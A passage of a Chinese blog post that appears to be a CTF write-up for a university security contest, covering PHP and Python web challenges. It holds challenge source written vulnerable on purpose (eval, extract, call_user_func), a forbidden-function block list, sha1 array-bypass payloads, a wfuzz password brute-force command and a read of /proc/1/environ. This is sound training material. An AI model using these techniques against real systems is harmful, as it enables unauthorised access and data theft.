src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423213518692.png"></p><hr><h3 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h3><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423214507413.png"></p><p>成功上传。</p><hr><h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br><span class="hljs-variable">$token</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$param2</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$param1</span>) == <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$param2</span>))&#123;<br>        <span class="hljs-variable">$token</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Level 1 pass\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TYctf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$person</span> = <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$computer_number</span> = <span class="hljs-number">30</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNumber</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;person)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;person;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isFullUse</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;person != <span class="hljs-variable language_">$this</span>-&gt;computer_number)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;computer is lacking !!!\n&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;computer is enough !!!\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getKey</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span> (<span class="hljs-string">&quot;flag.php&quot;</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Level 2 pass\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are winner, this is your reward: \n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>)&#123;<br>    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>需要调用<code>TYctf</code>类中的静态函数<code>getkey</code>去包含<code>flag.php</code></p><p><code>extract($_GET);</code>会将<code>GET数组</code>中的键作为变量名，值作为变量值。</p><p>首先我们需要让<code>$token</code>为<code>true</code>从而能够执行<code>call_user_func</code>来调用我们的<code>TYctf::getkey</code></p><blockquote><p>payload :</p><p>GET:<code>?param1[]=1&amp;param2[]=2 </code></p><p>POST: <code>payload=TYctf::getKey</code></p></blockquote><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423215015342.png"></p><hr><h3 id="无参之舞"><a href="#无参之舞" class="headerlink" title="无参之舞"></a>无参之舞</h3><p>源代码中有提示 </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423215130560.png"></p><p>进行爆破。</p><p><code> wfuzz -c -u &quot;http://challenge.qsnctf.com:31788/&quot; -d &quot;username=sqctf&amp;password=FUZZ&quot; -w /usr/share/wordlists/fuzzDicts-master/passwordDict/top3000.txt --hh 4515</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423215459499.png"></p><p>密码<code>1q2w3e4r</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423215531581.png"></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423215628232.png"></p><p><code>readfile(&#39;index.php&#39;);</code></p><p>直接读flag。<code>readfile(&#39;f1ag.php&#39;);</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423220510036.png"></p><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 防止直接文件包含</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;别想读flag&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log|read|file|dir|open|scandir|var|loc|conv|rot/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不可以哒！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 防止直接函数调用</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z_]+ $/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 防止敏感函数调用</span><br>    <span class="hljs-variable">$forbidden_functions</span> = [<br>        <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>, <span class="hljs-string">&#x27;create_function&#x27;</span>, <span class="hljs-string">&#x27;call_user_func&#x27;</span>, <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;proc_open&#x27;</span>, <span class="hljs-string">&#x27;pcntl_exec&#x27;</span>, <span class="hljs-string">&#x27;pcntl_fork&#x27;</span>, <span class="hljs-string">&#x27;pcntl_waitpid&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wait&#x27;</span>,<span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;highlight_file&#x27;</span>, <span class="hljs-string">&#x27;readgzfile&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wexitstatus&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wtermsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wstopsig&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifcontinued&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifsignaled&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifstopped&#x27;</span>, <span class="hljs-string">&#x27;pcntl_wifexited&#x27;</span>, <span class="hljs-string">&#x27;preg_replace&#x27;</span>, <span class="hljs-string">&#x27;ereg_replace&#x27;</span>, <span class="hljs-string">&#x27;str_replace&#x27;</span>, <span class="hljs-string">&#x27;strtr&#x27;</span>, <span class="hljs-string">&#x27;str_rot13&#x27;</span>, <span class="hljs-string">&#x27;base64_decode&#x27;</span>, <span class="hljs-string">&#x27;urldecode&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;ord&#x27;</span>, <span class="hljs-string">&#x27;unpack&#x27;</span>, <span class="hljs-string">&#x27;pack&#x27;</span>, <span class="hljs-string">&#x27;gzinflate&#x27;</span>, <span class="hljs-string">&#x27;gzuncompress&#x27;</span>, <span class="hljs-string">&#x27;gzdecode&#x27;</span>, <span class="hljs-string">&#x27;array_shift&#x27;</span>, <span class="hljs-string">&#x27;show_source&#x27;</span><br>    ];<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$forbidden_functions</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>], <span class="hljs-variable">$func</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 防止正则表达式绕过</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/preg_replace|ereg_replace/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\$\w+|\b(eval|exec|system|shell_exec|passthru)\b/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;非法输入！&quot;</span>);<br>&#125;<br>    <span class="hljs-comment">// 防止字符串拼接绕过</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\s*[a-zA-Z_]+\s* $/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;缺少了一点东西哦&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 防止变量函数调用</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\$\w+\s* $/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 如果通过以上检查，则执行代码</span><br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;请输入参数 exp 来尝试获取 flag！&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>   <br></code></pre></td></tr></table></figure><hr><h3 id="千查万别"><a href="#千查万别" class="headerlink" title="千查万别"></a>千查万别</h3><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423220705517.png"></p><p>随便输入后看url，有文件读取 </p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423221032437.png"></p><p>查看响应头发现是python，尝试读取<code>/proc/1/environ</code></p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423221106666.png"></p><p>emmm，这个应该是非预期，官方wp还没出这个时候。</p><hr><h3 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h3><p>查看源代码就有</p><p><img src="/img/%E5%95%86%E4%B8%98%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8F%8A%E4%BF%A1%E6%81%AF%E5%AF%B9%E6%8A%97%E5%A4%A7%E8%B5%9B/image-20250423221204640.png"></p><hr><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><p>php反序列化 字符串逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span 